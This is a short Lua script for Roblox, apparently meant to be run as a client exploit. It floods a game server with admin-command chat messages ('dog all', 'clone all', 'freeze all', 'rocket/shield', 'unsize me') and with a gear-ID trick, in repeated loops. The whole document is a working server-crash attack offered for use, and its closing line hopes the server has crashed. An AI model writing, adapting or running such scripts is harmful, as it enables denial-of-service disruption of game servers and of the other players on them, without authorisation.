print("trying dog crash...")
for i = 1,100 do
    game.Players:Chat("dog all all all")
    game.Players:Chat("clone all all all")
end

game.Players:Chat("reload me")

print("trying freeze crash...")
for i = 1,100 do
    game.Players:Chat("freeze all all all")
    game.Players:Chat("clone all all all")
end

game.Players:Chat("reload me")

print("trying rocket/shield crash...")
for i = 1,100 do
    game.Players:Chat("shield/all/all/all")
    game.Players:Chat("rocket/all/all/all")
    game.Players:Chat("clone/all/all/all")
end

game.Players:Chat("reload me")

print("trying vg crash...")
game.Players:Chat("gear me 0000000000000000000000000094794847")
local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
for _, v in ipairs(Backpack:GetChildren()) do
    v.Parent = game.Players.LocalPlayer.Character
    v:Activate()
end
wait(.15)
for i = 1,100 do
    game.Players:Chat("unsize me me me")
end

game.Players:Chat("reload me")

print("the server should be crashed! sorry if it didn't.")